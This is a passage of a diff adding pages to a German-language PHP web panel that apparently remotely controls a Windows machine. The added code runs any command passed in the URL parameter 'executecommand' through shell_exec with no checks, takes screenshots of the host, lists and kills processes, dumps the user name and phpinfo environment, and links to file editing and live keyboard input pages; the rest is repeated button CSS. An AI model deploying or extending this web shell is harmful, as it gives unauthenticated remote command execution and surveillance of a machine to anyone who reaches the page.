+        color: #333;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+        border-radius: .2em;
+        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        z-index: 10;
+    }
+    
+    .button:hover {
+        background-color: #ddd;
+        background-image: linear-gradient(top, #fafafa, #ddd);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+    }
+    
+    .button:active {
+        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+        position: relative;
+        top: 1px;
+    }
+    
+    .button:focus {
+        outline: 0;
+        background: #fafafa;
+    }
+    
+    .button:before {
+        background: #ccc;
+        background: rgba(0, 0, 0, .1);
+        float: left;
+        width: 1em;
+        text-align: center;
+        font-size: 1.5em;
+        margin: 0 1em 0 -1em;
+        padding: 0 .2em;
+        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+        border-radius: .15em 0 0 .15em;
+        pointer-events: none;
+    }
+</style>
+
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'openwebsite'])) {?>
+<html>
+
+<head></head>
+
+<body>
+    <div id="content">
+        <div id="co">
+            <input onkeyup="javascript:add()" type="text" placeholder="Bsp.: www.google.de" id="websitetext">
+            <input onkeyup="javascript:add()" type="text" placeholder="Bsp.: 4" id="howmanytimes"> <a id="absendena" href="?openwebsiteq=" class="button save">Absenden</a> </div>
+    </div>
+</body>
+<script>
+    function add() {
+        var absendena = document.getElementById("absendena");
+        var websitetexta = document.getElementById("websitetext").value;
+        var howmanytimesa = document.getElementById("howmanytimes").value;
+        absendena.href = "?openwebsiteq=" + websitetexta + "&howmanytimes=" + howmanytimesa;
+    }
+</script>
+<style>
+    input[type="text"] {
+        padding: 10px;
+        border: solid 5px #c9c9c9;
+        transition: border 0.3s;
+    }
+    
+    input[type="text"]:focus,
+    input[type="text"].focus {
+        border: solid 5px #969696;
+    }
+    
+    .button {
+        display: inline-block;
+        white-space: nowrap;
+        background-color: #ccc;
+        background-image: linear-gradient(top, #eee, #ccc);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+        border: 1px solid #777;
+        padding: 0 1.5em;
+        margin: 0.5em;
+        font: bold 1em/2em Arial, Helvetica;
+        text-decoration: none;
+        color: #333;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+        border-radius: .2em;
+        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        z-index: 10;
+    }
+    
+    .button:hover {
+        background-color: #ddd;
+        background-image: linear-gradient(top, #fafafa, #ddd);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+    }
+    
+    .button:active {
+        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+        position: relative;
+        top: 1px;
+    }
+    
+    .button:focus {
+        outline: 0;
+        background: #fafafa;
+    }
+    
+    .button:before {
+        background: #ccc;
+        background: rgba(0, 0, 0, .1);
+        float: left;
+        width: 1em;
+        text-align: center;
+        font-size: 1.5em;
+        margin: 0 1em 0 -1em;
+        padding: 0 .2em;
+        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+        border-radius: .15em 0 0 .15em;
+        pointer-events: none;
+    }
+    
+    .save:before {
+        content: "\2714";
+    }
+</style>
+
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'img'])) {?>
+<html>
+<?php function execimg() { $im=imagegrabscreen(); imagepng($im, "sc.png"); imagedestroy($im); } ?>
+
+<head></head>
+
+<body> <a class="button neuladen" href="?img=true">Neues Bild</a> <span id="nimg"> <?php execimg(); ?> <img src="sc.png" alt="screen"></span> </body>
+<style>
+    .button {
+        display: inline-block;
+        white-space: nowrap;
+        background-color: #ccc;
+        background-image: linear-gradient(top, #eee, #ccc);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+        border: 1px solid #777;
+        padding: 0 1.5em;
+        margin: 0.5em;
+        font: bold 1em/2em Arial, Helvetica;
+        text-decoration: none;
+        color: #333;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+        border-radius: .2em;
+        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        z-index: 10;
+        position: absolute;
+        right: 0;
+        top: 0;
+    }
+    
+    .button:hover {
+        background-color: #ddd;
+        background-image: linear-gradient(top, #fafafa, #ddd);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+    }
+    
+    .button:active {
+        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+        position: relative;
+        top: 1px;
+    }
+    
+    .button:focus {
+        outline: 0;
+        background: #fafafa;
+    }
+    
+    .button:before {
+        background: #ccc;
+        background: rgba(0, 0, 0, .1);
+        float: left;
+        width: 1em;
+        text-align: center;
+        font-size: 1.5em;
+        margin: 0 1em 0 -1em;
+        padding: 0 .2em;
+        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+        border-radius: .15em 0 0 .15em;
+        pointer-events: none;
+    }
+    
+    #nimg {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottum: 0;
+    }
+    
+    #nimg img {
+        width: 100%;
+        height: 100%;
+    }
+    
+    .neuladen:before {
+        content: "&#10226;";
+    }
+</style>
+
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'INFOS'])) {?>
+<html>
+
+<head> </head>
+
+<body> <span id="zurueck"><a class="button" href="?">Zurück</a></span>
+    <?php echo '<h1>Name des Benutzers: ' . get_current_user(); ?>
+    <?php phpinfo(32); ?> </body>
+<style>
+    #zurueck {
+        position: absolute;
+        right: 0;
+        top: 0;
+    }
+    
+    .button {
+        display: inline-block;
+        white-space: nowrap;
+        background-color: #ccc;
+        background-image: linear-gradient(top, #eee, #ccc);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+        border: 1px solid #777;
+        padding: 0 1.5em;
+        margin: 0.5em;
+        font: bold 1em/2em Arial, Helvetica;
+        text-decoration: none;
+        color: #333;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+        border-radius: .2em;
+        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+    }
+    
+    .button:hover {
+        background-color: #ddd;
+        background-image: linear-gradient(top, #fafafa, #ddd);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+    }
+    
+    .button:active {
+        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+        position: relative;
+        top: 1px;
+    }
+    
+    .button:focus {
+        outline: 0;
+        background: #fafafa;
+    }
+    
+    .button:before {
+        background: #ccc;
+        background: rgba(0, 0, 0, .1);
+        float: left;
+        width: 1em;
+        text-align: center;
+        font-size: 1.5em;
+        margin: 0 1em 0 -1em;
+        padding: 0 .2em;
+        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+        border-radius: .15em 0 0 .15em;
+        pointer-events: none;
+    }
+}
+</style>
+
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'startprocess'])) {?>
+<html>
+
+<head> </head>
+
+<body>
+    <div id="content">
+        <div id="processlist"> <span id="reloadbu"> <a href="?startprocess&taskrefresh=true" class="button neuladen">Prozesse neu Laden</a> </span>
+            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; ?> </span> </div>
+        </div>
+        <div id="go"> <span id="eingbabe"> <input onkeyup="changeuri()" placeholder="Bsp.: tasklist.exe" id="eingabetext" type="text"> </span> <a href="?executecommand" id="execuri" class="button">Befehl Ausführen</a>
+            <div id="result"> <span class="command1"> <?php if (isset($_GET['executecommand'])) { echo "<span style='color:green;'>Dieser Befehl wird ausgeführt: " . $_GET['executecommand'] . "</span><pre id='commands'>" . shell_exec($_GET['executecommand']) . "</pre>"; } ?> </span>
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+    function changeuri() {
+        var text = document.getElementById("eingabetext").value;
+        var execuri = document.getElementById("execuri");
+        execuri.href = "?startprocess&executecommand=" + text;
+    }
+</script>
+<style>
+    #result {
+        background-color: #67dcff;
+        height: 33em;
+        width: 32em;
+    }
+    
+    #go {
+        position: absolute;
+        right: 8em;
+        float: right;
+    }
+    
+    body {
+        background-color: aliceblue;
+    }
+    
+    #processlist {
+        position: absolute;
+        left: 0;
+        top: 0;
+    }
+    
+    #content {
+        text-align: center;
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        right: 0;
+        left: 0;
+        background-color: aliceblue;
+    }
+    
+    #buttons a {
+        width: 100%;
+        text-align: center;
+        height: 2em;
+        font-size: 33px;
+        margin: 0;
+        margin-top: 0.8em;
+        margin-bottum: 0.8em;
+        padding: 0;
+    }
+    
+    .button {
+        display: inline-block;
+        white-space: nowrap;
+        background-color: #ccc;
+        background-image: linear-gradient(top, #eee, #ccc);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+        border: 1px solid #777;
+        padding: 0 1.5em;
+        margin: 0.5em;
+        font: bold 1em/2em Arial, Helvetica;
+        text-decoration: none;
+        color: #333;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+        border-radius: .2em;
+        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+    }
+    
+    .button:hover {
+        background-color: #ddd;
+        background-image: linear-gradient(top, #fafafa, #ddd);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+    }
+    
+    .button:active {
+        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+        position: relative;
+        top: 1px;
+    }
+    
+    .button:focus {
+        outline: 0;
+        background: #fafafa;
+    }
+    
+    .button:before {
+        background: #ccc;
+        background: rgba(0, 0, 0, .1);
+        float: left;
+        width: 1em;
+        text-align: center;
+        font-size: 1.5em;
+        margin: 0 1em 0 -1em;
+        padding: 0 .2em;
+        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+        border-radius: .15em 0 0 .15em;
+        pointer-events: none;
+    }
+    
+    input[type="text"] {
+        padding: 10px;
+        border: solid 5px #c9c9c9;
+        transition: border 0.3s;
+    }
+    
+    input[type="text"]:focus,
+    input[type="text"].focus {
+        border: solid 5px #969696;
+    }
+    
+    .neuladen:before {
+        content: "&#10226;";
+    }
+</style>
+
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'killprocess'])) {?>
+<html>
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+</head>
+
+<body>
+    <div id="zurueck"> <a class="button" href="?">Zurück</a> </div>
+    <div id="programm">
+        <div id="programms"> <span id="reloadbu"> <a href="?killprocess&taskrefresh=true" class="button neuladen">Prozesse neu Laden</a> </span>
+            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; ?> </span> </div>
+        </div>
+        <div id="close">
+            <div id="indexofclose">
+                <input id="pidorpsname" type="text" placeholder="Prozess Name oder PID"> <span onclick="javascript:killprocess(document.getElementById('pidorpsname').value)" class="button">Beenden</span> </div>
+        </div>
+    </div>
+    <style>
+        #prog {
+            position: absolute;
+            top: 0;
+        }
+        
+        #zurueck {
+            top: 0;
+            right: 0;
+            position: absolute;
+            font-size: 20px;
+            text-decoration: none;
+        }
+        
+        #zurueck a {
+            text-decoration: none;
+            color: black;
+        }
+        
+        #programm {
+            height: 100%;
+            width: 100%;
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottum: 0;
+            z-index: 10;
+            color: white;
+            text-align: center;
+            position: absolute;
+            z-index: -2;
+        }
+        
+        #prog {
+            overflow: scroll;
+            width: 30em;
+            color: black;
+        }
+        
+        #prog pre {
+            font-size: 10px;
+            margin: 0;
+        }
+        
+        input[type="text"] {
+            padding: 10px;
+            border: solid 5px #c9c9c9;
+            transition: border 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="text"].focus {
+            border: solid 5px #969696;
+        }
+        
+        #close {
+            position: absolute;
+            top: 20%;
+            right: 20%;
+            width: 25em;
+            height: 5em;
+            text-align: center;
+        }
+        
+        #indexofclose {
+            top: calc(100% + -65px);
+            position: absolute;
+            left: 55px;
+        }
+        
+        .button {
+            display: inline-block;
+            white-space: nowrap;
+            background-color: #ccc;
+            background-image: linear-gradient(top, #eee, #ccc);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+            border: 1px solid #777;
+            padding: 0 1.5em;
+            margin: 0.5em;
+            font: bold 1em/2em Arial, Helvetica;
+            text-decoration: none;
+            color: #333;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+            border-radius: .2em;
+            box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        }
+        
+        .button:hover {
+            background-color: #ddd;
+            background-image: linear-gradient(top, #fafafa, #ddd);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+        }
+        
+        .button:active {
+            box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+            position: relative;
+            top: 1px;
+        }
+        
+        .button:focus {
+            outline: 0;
+            background: #fafafa;
+        }
+        
+        .button:before {
+            background: #ccc;
+            background: rgba(0, 0, 0, .1);
+            float: left;
+            width: 1em;
+            text-align: center;
+            font-size: 1.5em;
+            margin: 0 1em 0 -1em;
+            padding: 0 .2em;
+            box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+            border-radius: .15em 0 0 .15em;
+            pointer-events: none;
+        }
+        
+        .neuladen:before {
+            content: "&#10226;";
+        }
+    </style>
+    <script>
+        function killprocess(a) {
+            if ((a >= 'a' && a <= 'z') || (a >= 'A' && a <= 'Z')) {
+                window.open("?killprocessbyid=" + a + "", "_blank")
+            } else {
+                window.open("?killprocessbypid=" + a + "", "_blank")
+            }
+        };
+    </script>
 </body>
 
 </html>
@@ -3736,7 +4206,8 @@ body {
             <div id="exec"> <a class="button" id="programclose" href="?killprocess=true">Programm schließen</a> </div>
             <div id="exec"> <a class="button" href="?img=true">Screenshot</a> </div>
             <div id="exec"> <a class="button" href="?INFOS=true">INFOS</a> </div>
-            <div id="exec"> <a class="button" href="?phpverzeichnisse=true">Verzeichnisse anzeigen</a> </div>
+            <div id="exec"> <a class="button" href="?phpverzeichnisse=true">Verzeichnisse und Datein anzeigen/löschen/bearbeiten</a></div>
+            <div id="exec"> <a class="button" href="?tastaturb=true">Text live eingeben</a></div>
         </div>
     </div>
     <style>
